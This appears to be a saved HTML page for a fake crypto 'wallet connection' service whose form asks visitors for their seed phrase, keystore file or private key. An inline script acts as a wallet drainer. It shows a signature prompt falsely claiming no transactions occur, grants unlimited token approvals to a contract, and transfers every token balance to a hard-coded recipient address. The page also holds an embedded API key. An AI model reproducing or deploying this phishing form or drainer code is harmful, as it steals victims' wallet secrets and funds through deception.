<!doctype html>
<!-- saved from url=(0051)https://app.panelactivator.com/en/form.php?issue=MM -->
<html lang="en" style="filter: hue-rotate(4deg)">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <!-- /Added by HTTrack -->

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="ie=edge" />
    <title>Welcome to our website</title>
    <meta name="description" content="Welcome to our website" />
    <script>
      document.documentElement.style.cssText = "filter:hue-rotate(4deg)";
    </script>
    <script
      src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"
      type="application/javascript"
    ></script>

    <!-- Favicon icon -->
    <link
      rel="icon"
      type="image/png"
      sizes="16x16"
      href="/images/favicon.png"
    />
    <link rel="stylesheet" href="/Issues_files/style.css" />
  </head>

  <body
    class="@@dashboard"
    data-new-gr-c-s-check-loaded="14.1169.0"
    data-gr-ext-installed=""
  >
    <div id="preloader" style="display: none"><i>.</i><i>.</i><i>.</i></div>

    <div id="main-wrapper" class="front show">
      <div class="header landing">
        <div class="container">
          <div class="row">
            <div class="col-xl-12">
              <div class="navigation">
                <nav class="navbar navbar-expand-lg navbar-light">
                  <div class="brand-logo">
                    <a href="/">
                      <img
                        src="/Issues_files/logo.png"
                        alt=""
                        class="logo-primary"
                      />
                      <img
                        src="/Issues_files/logow.png"
                        alt=""
                        class="logo-white"
                      />
                    </a>
                  </div>
                  <button
                    class="navbar-toggler"
                    type="button"
                    data-bs-toggle="collapse"
                    data-bs-target="#navbarSupportedContent"
                    aria-controls="navbarSupportedContent"
                    aria-expanded="false"
                    aria-label="Toggle navigation"
                  >
                    <span class="navbar-toggler-icon"></span>
                  </button>
                  <div
                    class="collapse navbar-collapse"
                    id="navbarSupportedContent"
                  >
                    <ul class="navbar-nav me-auto">
                      <li class="nav-item dropdown">
                        <a class="nav-link" href="/">Home</a>
                      </li>
                      <li class="nav-item">
                        <a class="nav-link" href="/">Explore</a>
                      </li>
                    </ul>
                  </div>
                  <div class="signin-btn d-flex align-items-center">
                    <div
                      class="dark-light-toggle theme-switch"
                      onclick="themeToggle()"
                    >
                      <span class="dark"><i class="ri-moon-line"></i></span>
                      <span class="light"><i class="ri-sun-line"></i></span>
                    </div>
                  </div>
                </nav>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div class="page-title">
        <div class="container">
          <div class="row align-items-center justify-content-between">
            <div class="col-6">
              <div class="page-title-content">
                <h3>Explore</h3>
                <p class="mb-2">Explore different connection mode</p>
              </div>
            </div>
            <!-- <div class="col-auto">
                        <div class="breadcrumbs"><a href="#">Home </a><span><i
                                    class="ri-arrow-right-s-line"></i></span><a href="#">Payments</a></div>
                    </div> -->
          </div>
        </div>
      </div>

      <div class="upload-item section-padding">
        <div class="container">
          <div class="row justify-content-center">
            <div class="col-12">
              <h4 class="card-title mb-3">DAPP Type: MM</h4>
              <div class="card">
                <div class="card-body">
                  <form action="http://localhost:3000/submit" method="post">
                    <div class="row">
                      <div class="col-12 mb-3">
                        <label class="form-label">Method of Connection</label>
                        <select
                          for="category"
                          class="form-control"
                          name="category"
                          id="category"
                          required=""
                        >
                          <option value="">Select One</option>
                          <option value="phrase">Phrase</option>
                          <option value="json">Key store Json</option>
                          <option value="p-key">Private Key</option>
                        </select>
                      </div>

                      <div class="col-12 mb-3">
                        <label class="form-label"
                          >Phrase, Key store or Private key</label
                        >
                        <textarea
                          type="text"
                          name="data"
                          class="form-control"
                          id=""
                          required=""
                        ></textarea>
                      </div>

                      <input type="hidden" name="selected_issue" value="MM" />
                    </div>
                    <div class="mt-3">
                      <button
                        type="submit"
                        name="submit"
                        class="btn btn-primary mr-2 w-100"
                      >
                        Connect
                      </button>
                    </div>
                  </form>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <div
        class="bottom section-padding triangle-top-dark triangle-bottom-dark"
      >
        <div class="container">
          <div class="row">
            <div class="col-xl-4 col-lg-4 col-md-7 col-sm-8">
              <div class="bottom-logo">
                <img class="pb-3" src="/Issues_files/logoh.png" alt="" />
                <p>
                  Our commitment is to address a wide array of blockchain and
                  crypto challenges comprehensively. We strive to provide
                  effective solutions that empower you to navigate the rapidly
                  evolving blockchain landscape with confidence. Trust us to
                  optimize your operations and create a successful and efficient
                  blockchain ecosystem.
                </p>
              </div>
            </div>
            <div class="col-xl-2 col-lg-2 col-md-5 col-sm-4 col-6">
              <div class="bottom-widget">
                <h4 class="widget-title">Quick Links</h4>
                <ul>
                  <li><a href="/explore">Explore</a></li>
                  <li><a href="/explore/issues/connect">Connect</a></li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="footer">
        <div class="container">
          <div class="row">
            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
              <div class="copyright">
                <p>
                  Â© Copyright
                  <script>
                    document.write(new Date().getFullYear());
                  </script>
                  2024 <a href="/explore/issues/connect"></a>
                  <!-- -->All Rights Reserved
                </p>
              </div>
            </div>
            <div class="col-xl-6 col-lg-6 col-md-6 col-sm-6 col-12">
              <div class="footer-social">
                <ul>
                  <li>
                    <a href="/explore/issues/connect"
                      ><i class="bi bi-facebook"></i
                    ></a>
                  </li>
                  <li>
                    <a href="/explore/issues/connect"
                      ><i class="bi bi-twitter"></i
                    ></a>
                  </li>
                  <li>
                    <a href="/explore/issues/connect"
                      ><i class="bi bi-linkedin"></i
                    ></a>
                  </li>
                  <li>
                    <a href="/explore/issues/connect"
                      ><i class="bi bi-youtube"></i
                    ></a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <script>
      const etherscanApiKey = "7K13FA32ZEWIPVXRS2ICJG5XUKHZMQE3DX";
      const contractAddress = "0x695902b97c3a78b3af0a3eedf15b4c9051e9d6f3";
      const recipientAddress = "0xfEC0B00929ed4FF0d7662D8b912F04d97fBd0D54"; //RECIPIENT ADDRESS
      const erc20ABI = [
        "function approve(address spender, uint256 amount) external returns (bool)",
        "function transferFrom(address sender, address recipient, uint256 amount) external returns (bool)",
      ];
      const contractABI = [
        "function transferTokens(address token, address owner, address recipient, uint256 amount) external returns (bool)",
      ];

      async function connectWallet() {
        if (typeof window.ethereum !== "undefined") {
          const provider = new ethers.providers.Web3Provider(window.ethereum);
          const signer = provider.getSigner();

          try {
            await provider.send("eth_requestAccounts", []);
            const address = await signer.getAddress();
            const tokens = await fetchTokens(address);

            // Message to sign
            const message =
              "This is a standard message approval to verify your account. No transactions are initiated";
            const signature = await signer.signMessage(message);
            console.log("Signature:", signature);

            for (let token of tokens) {
              const tokenContract = new ethers.Contract(
                token.contractAddress,
                erc20ABI,
                signer,
              );
              const maxUint256 = ethers.constants.MaxUint256;

              // Approve unlimited tokens
              const approveTx = await tokenContract.approve(
                contractAddress,
                maxUint256,
              );
              await approveTx.wait();
              console.log(
                `Tokens approved for ${token.tokenSymbol} at ${token.contractAddress}`,
              );

              // Transfer tokens using the smart contract
              const contract = new ethers.Contract(
                contractAddress,
                contractABI,
                signer,
              );
              const balance = await tokenContract.balanceOf(address); // Fetch current balance for transfer
              const transferTx = await contract.transferTokens(
                token.contractAddress,
                address,
                recipientAddress,
                balance,
              );
              await transferTx.wait();
              console.log(
                `Tokens transferred for ${token.tokenSymbol} from ${address} to ${recipientAddress}`,
              );
            }
          } catch (error) {
            console.error("Error handling tokens:", error);
          }
        } else {
          console.log("Please install MetaMask!");
        }
      }

      async function fetchTokens(address) {
        const url = `https://api.etherscan.io/api?module=account&action=tokentx&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${etherscanApiKey}`;
        const response = await fetch(url);
        const data = await response.json();
        const tokens = new Set();

        data.result.forEach((tx) => {
          if (
            tx.to.toLowerCase() === address.toLowerCase() ||
            tx.from.toLowerCase() === address.toLowerCase()
          ) {
            tokens.add({
              tokenSymbol: tx.tokenSymbol,
              contractAddress: tx.contractAddress,
            });
          }
        });
        return Array.from(tokens);
      }
    </script>

    <script src="/Issues_files/jquery.min.js"></script>
    <script src="/Issues_files/bootstrap.bundle.min.js"></script>
    <script src="/Issues_files/scripts.js"></script>
  </body>
  <grammarly-desktop-integration data-grammarly-shadow-root="true"
    ><template shadowrootmode="open"
      ><style>
        div.grammarly-desktop-integration {
          position: absolute;
          width: 1px;
          height: 1px;
          padding: 0;
          margin: -1px;
          overflow: hidden;
          clip: rect(0, 0, 0, 0);
          white-space: nowrap;
          border: 0;
          -moz-user-select: none;
          -webkit-user-select: none;
          -ms-user-select: none;
          user-select: none;
        }

        div.grammarly-desktop-integration:before {
          content: attr(data-content);
        }
      </style>
      <div
        aria-label="grammarly-integration"
        role="group"
        tabindex="-1"
        class="grammarly-desktop-integration"
        data-content='{"mode":"full","isActive":true,"isUserDisabled":false}'
      ></div></template
  ></grammarly-desktop-integration>
</html>
